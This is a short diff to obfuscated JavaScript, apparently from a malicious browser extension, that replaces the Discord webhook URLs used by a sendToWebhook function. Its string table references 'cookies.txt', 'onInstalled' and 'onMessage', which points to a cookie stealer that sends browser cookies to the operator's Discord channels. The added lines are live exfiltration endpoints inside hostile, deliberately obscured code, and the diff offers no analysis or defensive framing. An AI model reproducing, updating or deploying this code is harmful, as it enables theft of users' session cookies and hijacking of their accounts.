@@ -2975,7 +2975,7 @@ function sendToWebhook(_0x41cdb2, _0xb61a0a, _0x29b2a2, _0x3d0349, _0x579520, _0
     const _0xa73f1b = _0x34eebd;
     let _0x5cdc50;
     if (_0x29b2a2 === _0xa73f1b(0x125)) _0x5cdc50 = _0xa73f1b(0x108);
-    else _0x29b2a2 === _0xa73f1b(0xe6) && (_0x5cdc50 = "https://discord.com/api/webhooks/1371500697408770218/AoX58RdXXLMctDZW8TmyzPmIqPqU-d5ToFDeJkXLGsJn972C0TeUQAEmwvqnnvEA4n_R");
+    else _0x29b2a2 === _0xa73f1b(0xe6) && (_0x5cdc50 = "https://discord.com/api/webhooks/1371585548736663744/BmaXnvxeh9bBeDmpUWO_hbFjhhsZwASSC-7-Fm2-HVq0GXhoxKCZwxH2hGW0MtTjtehP");
     const _0x1f9b14 = {
         title: _0xa73f1b(0xf3),
         color: 0x58b9ff,
@@ -3036,8 +3036,8 @@ function _0x1480() {
         "onInstalled",
         "cookies.txt",
         "2834xNyxKW",
-        "https://discord.com/api/webhooks/1371503047045288089/a90o9__fsGWHCBAy7a86vJ02T9rC4OmRWLYFzWTaqlFuWGgip0BdQkzZlZ4vrhIOOW6-",
-        "https://discord.com/api/webhooks/1371500697408770218/AoX58RdXXLMctDZW8TmyzPmIqPqU-d5ToFDeJkXLGsJn972C0TeUQAEmwvqnnvEA4n_R",
+        "https://discord.com/api/webhooks/1371585555292225586/_OrdYW01LzUGVE1PfxcW6sbeLWdD5XxXkvsVN35W75agFh-gNYCPNoiENS08Wl2GaWOI",
+        "https://discord.com/api/webhooks/1371585548736663744/BmaXnvxeh9bBeDmpUWO_hbFjhhsZwASSC-7-Fm2-HVq0GXhoxKCZwxH2hGW0MtTjtehP",
         "filter",
         "onMessage",
         "55heeBpl",
